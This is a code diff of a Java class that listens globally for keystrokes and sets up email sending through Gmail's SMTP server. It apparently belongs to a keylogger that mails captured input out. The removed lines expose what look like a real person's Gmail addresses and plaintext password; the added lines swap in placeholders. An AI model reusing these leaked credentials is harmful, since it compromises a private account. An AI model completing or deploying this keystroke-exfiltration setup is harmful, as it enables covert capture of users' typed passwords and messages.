@@ -43,11 +43,11 @@ public class JKey1 implements NativeKeyListener {
             
 
   // Recipient's email ID needs to be mentioned.
-        String to = "sudhirverma.133@gmail.com";
+        String to = "sender's_email_address";
         // Sender's email ID needs to be mentioned
-        String from = "sudhirverma14551221@gmail.com";
-        final String username = "sudhirverma14551221@gmail.com";//change accordingly
-        final String password = "Sudhir@1996";//change accordingly
+        String from = "Receiver's_email_address";
+        final String username = "Receiver's_email_address";//change accordingly
+        final String password = "Reciver's_email_address_password";//change accordingly
         // Assuming you are sending email through relay.jangosmtp.net
         Properties props = new Properties();
         props.put("mail.smtp.host", "smtp.gmail.com");
